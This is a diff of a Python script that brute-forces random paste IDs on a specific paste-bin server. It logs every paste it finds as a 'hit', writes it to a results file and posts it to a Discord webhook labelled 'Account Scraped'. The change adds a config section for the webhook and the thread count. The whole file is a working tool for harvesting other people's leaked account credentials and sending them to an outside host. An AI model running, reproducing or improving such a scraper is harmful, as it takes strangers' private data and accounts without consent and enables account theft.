@@ -1,4 +1,3 @@
-import os
 try:
     from random import choice
     from string import ascii_letters
@@ -7,44 +6,43 @@ try:
     import colorama
     import requests
 except ModuleNotFoundError:
+    import os
     os.system("pip install dhooks colorama requests")
     
 colorama.init()
 
-
-
+## Config
+webhook = "" # your discord webhook here
+threads = 1 # higher = better chance of getting a account but requires a good pc
 
 class Main(Thread):
     def __init__(self):
         self.randstr = lambda length: ''.join(choice(ascii_letters) for _ in range(length))
-        self.webhook = ""
         super().__init__(daemon=True)
 
     def run(self) -> None:
         while True:
-            String = self.randstr(10)
-            with requests.get(f"http://bin.shortbin.eu:8080/documents/{String}") as Request:
-                if Request.status_code != 200:
-                    print(f"{colorama.Fore.RED}[-]  {String}")
-                    continue
-
-                data = Request.json()["data"]
-                print(f"{colorama.Fore.LIGHTGREEN_EX}[+]  {data}")
+            string = self.randstr(10)
+            request = requests.get(f"http://bin.shortbin.eu:8080/raw/{string}")
+            if request.status_code != 200:
+                print(f"{colorama.Fore.RED}[-] Failed | http://bin.shortbin.eu:8080/raw/{string} - {request.status_code} \n")
+                continue
                 
-                if self.webhook != "":
-                    try:
-                        hook = Webhook(self.webhook)
-                        hook.send(f"Account Scraped: `{data}`")
-                    except:
-                        pass
-                else:
+            print(f"{colorama.Fore.LIGHTGREEN_EX}[+] Hit | http://bin.shortbin.eu:8080/raw/{string} - {request.text} \n")
+
+            if webhook != "":
+                try:
+                    Webhook(webhook).send(f"Account Scraped: `{request.text}`")
+                except:
                     pass
+            else:
+                pass
 
-                with open("results.txt", "a+") as f:
-                    f.write(data + "\n")
+            with open("results.txt", "a+") as f:
+                f.write(request.text + "\n")
 
 
-for _ in range(1): # 1 is Thread
+for _ in range(threads):
     Main().start()
 while True:
     input()
